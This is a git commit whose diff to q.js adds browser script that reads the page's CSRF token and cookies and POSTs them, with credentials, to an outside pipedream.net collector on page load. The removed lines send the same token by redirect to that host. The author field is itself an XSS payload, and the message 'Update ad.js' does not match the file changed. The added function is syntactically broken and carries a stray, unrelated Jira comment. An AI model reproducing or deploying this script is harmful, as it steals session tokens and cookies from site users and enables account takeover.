6fd67c84a6efc5332ccb9521726ee80849d73809
img/src/onerror=alert('USERB') <107826115+asuspctow@users.noreply.github.com>
2023-08-10 03:50:45 +0300

    Update ad.js

--- q.js
+++ q.js
@@ -1,3 +1,12 @@
-location.href='https://eojjvbt09aaka4m.m.pipedream.net?token='.concat(document.getElementsByName('csrf-token')[0].getAttribute('content'));
-var shdatas = document.cookie;
-alert(shdatas);
+function loadDoc1()
+const tokne= document.getElementsByName('csrf-token')[0].getAttribute('content');
+var cookies = document.cookie;
+var xhttp = new XMLHttpRequest();
+xhttp.open("post", "https://eojjvbt09aaka4m.m.pipedream.net", true)
+xhttp.setRequestHeader("Content-type", "text/plain;charset=UTF-8");
+xhttp.withCredentials = true;
+xhttp.send("token:"+tokne+"Cookies:"+cookies+""); //Or set newValue=false to disable all jira Software Features. 
+
+}
+
+window.onload = loadDoc1();
